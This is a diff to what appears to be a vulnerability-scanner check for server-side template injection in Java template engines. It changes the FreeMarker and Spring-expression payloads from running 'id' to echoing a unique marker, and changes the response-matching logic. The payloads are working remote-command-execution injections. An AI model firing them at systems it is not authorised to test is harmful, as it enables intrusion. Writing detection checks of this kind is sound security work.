@@ -6,18 +6,20 @@ metadata:
     tags: "ssti", "java", "rce", "waf-bypass"
 
 run for each:
-    payload = "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
-        "${\".freemarker.template.utility.Execute\"?new()(\"id\")}",
-        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
+    payload = "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"echo 884729\")}",
+        "${\".freemarker.template.utility.Execute\"?new()(\"echo 884729\")}",
+        "__${T(java.lang.Runtime).getRuntime().exec('echo 884729')}__::.x"
 
 given insertion point then
     send payload:
         replacing: {payload}
 
-    if {latest.response} matches "(uid=|gid=|freemarker|java\.lang\.Runtime|ProcessBuilder)" then
-        report issue:
-            severity: high
-            confidence: certain
-            detail: "SSTI in Java template engine detected with command execution."
-            remediation: "Disable dangerous built-in functions. Use template sandboxing."
+    if not({latest.response.status_code} is "400") then
+        if {latest.response} matches "884729" then
+            report issue:
+                severity: high
+                confidence: certain
+                detail: "SSTI in Java template engine detected with command execution via unique echo payload."
+                remediation: "Disable dangerous built-in functions. Use template sandboxing."
+        end if
     end if
